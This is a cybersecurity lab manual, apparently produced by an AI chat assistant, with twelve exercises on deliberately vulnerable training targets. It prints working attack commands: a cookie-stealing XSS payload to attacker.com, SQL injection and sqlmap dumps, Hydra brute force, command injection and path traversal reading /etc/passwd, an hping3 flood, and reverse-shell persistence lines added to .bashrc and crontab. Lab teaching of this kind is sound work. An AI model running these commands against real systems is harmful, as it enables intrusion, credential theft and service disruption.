# Cybersecurity Lab Manual

## Lab 1: Network Scanning with Nmap
### Objective:
Learn to discover hosts and services on a network using Nmap.

### Tools Required:
- Nmap
- Virtual Machine (Kali Linux or Parrot OS)

### Procedure:
1. Open the terminal in Kali.
2. Run `ifconfig` to get your IP address.
3. Identify your network range (e.g., 192.168.1.0/24).
4. Run a basic scan: `nmap -sP 192.168.1.0/24`
5. Run a detailed scan: `nmap -sS -sV -T4 192.168.1.0/24`
6. Save results: `nmap -oN scan_results.txt 192.168.1.0/24`

## Lab 2: Packet Analysis with Wireshark
### Objective:
Understand packet structures and analyze traffic.

### Procedure:
1. Open Wireshark and select the active network interface.
2. Start capturing packets.
3. Open a browser and visit a few websites.
4. Stop the capture and analyze protocols like TCP, HTTP.
5. Use filters like `http`, `tcp.port == 80` to narrow down traffic.
6. Export interesting packets.

## Lab 3: Vulnerability Scanning with OpenVAS
### Objective:
Scan for known vulnerabilities in a system.

### Procedure:
1. Install OpenVAS: `sudo gvm-setup`
2. Start services: `sudo gvm-start`
3. Access via browser: `https://localhost:9392`
4. Create a new target.
5. Launch a scan and review the report.

## Lab 4: Web Application Hacking (DVWA)
### Objective:
Practice common web vulnerabilities.

### Procedure:
1. Install XAMPP and DVWA.
2. Set security level to low.
3. Practice SQL Injection, XSS, CSRF.
4. Use Burp Suite to capture and modify requests.

## Lab 5: XSS (Cross-Site Scripting) on DVWA
### Objective:
Understand and exploit XSS vulnerabilities.

### Procedure:
1. Open DVWA and log in.
2. Set security level to low.
3. Navigate to the XSS (Reflected) section.
4. Enter payload: `<script>alert('XSS')</script>`
5. Observe the alert box.
6. Try variations like cookie stealing: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
7. Switch to stored XSS and repeat steps with message board.
8. Increase security level and bypass input filters.

## Lab 6: SQL Injection (DVWA + VulnLogin)
### Objective:
Exploit SQL vulnerabilities to access restricted data.

### Procedure:
1. Open VulnLogin in your browser.
2. Try payload: `' OR 1=1--`
3. Observe if you bypass login.
4. Use `sqlmap` to automate:
   - `sqlmap -u "http://localhost/vulnlogin/login.php" --data "username=admin&password=admin" --dump`
5. Practice with error-based and time-based injection.

## Lab 7: Brute Force Attack (DVWA + VulnLogin)
### Objective:
Use brute force to crack login credentials.

### Procedure:
1. Use Hydra:
   - `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/vulnlogin/login.php:username=^USER^&password=^PASS^:Invalid"`
2. Try Burp Intruder to automate attack.
3. Observe success logins and analyze delays.

## Lab 8: Code Injection
### Objective:
Understand and exploit command injection flaws.

### Procedure:
1. Open DVWA -> Command Injection.
2. Input: `127.0.0.1; ls`
3. Try chained commands like `; cat /etc/passwd`
4. Understand filters and bypass techniques.
5. Practice privilege escalation scenarios.

## Lab 9: Directory Traversal
### Objective:
Access restricted files via path manipulation.

### Procedure:
1. Use DVWA or custom vulnerable server.
2. Input: `../../../../etc/passwd`
3. Try null byte attacks: `../../../../etc/passwd%00`
4. Bypass filters and explore log files.

## Lab 10: Denial of Service (DoS) Simulation
### Objective:
Simulate a basic DoS attack in a lab environment.

### Procedure:
1. Use `hping3` or `slowloris`.
2. Run: `hping3 -S -p 80 --flood <target-ip>`
3. Monitor resource usage on the target.
4. Ensure lab-only environment to avoid legal issues.

## Lab 11: Persistence on VM
### Objective:
Gain persistence after exploitation.

### Procedure:
1. Get reverse shell on victim VM (use msfvenom + listener).
2. Create a startup script: `echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> ~/.bashrc`
3. Alternatively, edit `crontab -e` and add:
   - `@reboot bash -i >& /dev/tcp/attacker/4444 0>&1`
4. Restart VM and test persistence.

## Lab 12: Website Code Modification
### Objective:
Deface a test web app (your own or DVWA) ethically.

### Procedure:
1. Navigate to the website's hosted directory.
2. Edit index.html or .php file: `nano index.php`
3. Change `<title>` and body content.
4. Save and refresh to see changes.
5. Restore the original after demo.

---

Let me know if you'd like to:
- Add more tools like Metasploit, Nikto, John the Ripper
- Include Windows-based forensics labs
- Bundle this manual as PDF with screenshots
- Create a report template for each lab

